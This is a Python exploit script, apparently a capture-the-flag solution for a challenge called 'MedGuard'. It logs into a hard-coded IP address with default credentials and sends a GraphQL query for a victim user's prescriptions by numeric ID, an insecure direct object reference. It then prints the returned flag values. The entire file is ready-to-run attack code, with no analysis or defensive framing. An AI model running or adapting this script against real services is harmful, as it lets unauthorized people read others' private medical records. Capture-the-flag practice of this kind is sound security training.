import argparse
import json
import sys
import urllib.error
import urllib.request
from http.cookiejar import CookieJar


def build_opener():
    jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post_json(opener, url, payload, timeout=10):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")

    with opener.open(req, timeout=timeout) as response:
        body = response.read().decode(errors="ignore")
        return response.status, body


def login(opener, base_url, username, password):
    status, body = post_json(
        opener,
        f"{base_url}/login",
        {"username": username, "password": password},
    )
    if status != 200:
        raise RuntimeError(f"Login failed with status {status}: {body[:200]}")

    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = {}

    return parsed


def query_prescriptions(opener, base_url, target_user_id):
    query = (
        "query {"
        f" getPrescriptions(userId: {target_user_id}) {{"
        " id userId prescriptionDetails flag"
        " }"
        "}"
    )
    status, body = post_json(opener, f"{base_url}/graphql", {"query": query})
    if status != 200:
        raise RuntimeError(f"GraphQL request failed with status {status}: {body[:200]}")

    try:
        parsed = json.loads(body)
    except json.JSONDecodeError as ex:
        raise RuntimeError(f"Invalid JSON from GraphQL: {body[:300]}") from ex

    return parsed


def extract_flags(graphql_json):
    data = graphql_json.get("data", {})
    rows = data.get("getPrescriptions", [])

    flags = []
    for row in rows:
        value = row.get("flag")
        if isinstance(value, str) and value.strip():
            flags.append(value.strip())

    return flags, rows


def main():
    parser = argparse.ArgumentParser(
        description="Solve MedGuard challenge via login + GraphQL IDOR"
    )
    parser.add_argument("--base", default="http://51.20.10.121:5003", help="Base URL")
    parser.add_argument("--username", default="user", help="Login username")
    parser.add_argument("--password", default="user", help="Login password")
    parser.add_argument(
        "--target-user-id",
        type=int,
        default=1,
        help="Victim user ID to query in GraphQL",
    )
    args = parser.parse_args()

    opener = build_opener()

    try:
        login_json = login(opener, args.base, args.username, args.password)
        print(f"[+] Login successful: {json.dumps(login_json)}")

        graphql_json = query_prescriptions(opener, args.base, args.target_user_id)
        flags, rows = extract_flags(graphql_json)

        print(f"[+] Retrieved rows: {len(rows)}")
        if flags:
            uniq = sorted(set(flags))
            for flag in uniq:
                print(f"[FLAG] {flag}")
            return 0

        print("[-] No flag field values found.")
        print(json.dumps(graphql_json, indent=2)[:1200])
        return 1

    except urllib.error.HTTPError as ex:
        try:
            body = ex.read().decode(errors="ignore")
        except Exception:
            body = ""
        print(f"[!] HTTP error {ex.code}: {body[:300]}")
        return 2
    except urllib.error.URLError as ex:
        print(f"[!] Network error: {ex}")
        return 3
    except Exception as ex:
        print(f"[!] Error: {ex}")
        return 4


if __name__ == "__main__":
    sys.exit(main())